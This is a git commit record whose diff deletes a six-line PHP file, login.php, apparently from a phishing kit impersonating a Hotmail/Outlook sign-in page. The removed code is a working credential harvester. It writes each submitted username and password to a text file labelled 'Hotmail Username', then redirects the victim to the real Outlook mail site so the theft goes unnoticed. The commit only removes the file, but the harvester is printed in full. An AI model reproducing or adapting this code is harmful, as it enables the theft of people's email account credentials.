08ebbad17994c00044cdf01ce61eee089ae7b1e3
unteniower <96322995+unteniower@users.noreply.github.com>
2021-12-18 10:27:28 +0800

    Delete login.php

--- login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("crede/usernames.txt", "Hotmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://outlook.live.com/mail/0/');
-exit();
-?>
